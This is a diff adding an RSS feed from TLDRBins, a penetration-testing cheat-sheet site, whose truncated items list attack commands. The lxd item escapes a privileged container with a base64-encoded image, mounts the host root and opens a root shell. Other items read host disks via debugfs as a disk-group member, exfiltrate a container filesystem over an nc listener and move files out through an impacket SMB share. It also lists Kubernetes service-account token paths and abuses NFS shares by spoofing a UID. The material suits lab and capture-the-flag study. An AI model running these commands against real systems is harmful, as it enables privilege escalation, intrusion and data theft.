@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>File System Mounting on TLDRBins</title>
+    <link>https://tldrbins.github.io/@file-system-mounting/</link>
+    <description>Recent content in File System Mounting on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@file-system-mounting/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>disk group</title>
+      <link>https://tldrbins.github.io/disk/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/disk/</guid>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) 1. Open target device debugfs /dev/sda1 # Read ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host 1. Show LVM mappings ls -l /dev/mapper/ 2. Exfil container&amp;rsquo;s filesystem # In our local machine nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; &amp;gt; dm-0.gz # Target container rootfs, e.</description>
+    </item>
+    <item>
+      <title>File Transfer (Windows To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
+      <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>Kubernetes</title>
+      <link>https://tldrbins.github.io/kubernetes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kubernetes/</guid>
+      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
+    </item>
+    <item>
+      <title>lxd</title>
+      <link>https://tldrbins.github.io/lxd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/lxd/</guid>
+      <description>Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Abuse #1: Mount host&amp;rsquo;s file system # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.</description>
+    </item>
+    <item>
+      <title>Mount Share</title>
+      <link>https://tldrbins.github.io/share_mount/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/share_mount/</guid>
+      <description> nfs smb List share showmount -e &amp;lt;TARGET&amp;gt; Mount share sudo mount -t nfs &amp;lt;TARGET&amp;gt;:/share /mnt/share/ Unmount share sudo umount /mnt/share/ Mount share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/share /mnt # Without creds sudo mount -t cifs -o user=,password= //&amp;lt;TARGET&amp;gt;/share /mnt # With creds sudo mount -t cifs -o user=&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;,pass=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/share /mnt Mount inside Windows # Mount net use \\localhost\c$ /u:&amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Check dir \\localhost\c$\users\administrator\desktop Abuse #1: Misconfigured Share # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +-----------------------------------------------------------------------------------------+ | root_squash : running as root on local system will be treated as nobody user in target | | no_all_squash: every other users permission will translate from local system to target | +-----------------------------------------------------------------------------------------+ # Add dummy user sudo useradd dummy # Change uid sudo usermod -u 1001 dummy # Switch to dummy user sudo su dummy -c bash </description>
+    </item>
+  </channel>
+</rss>
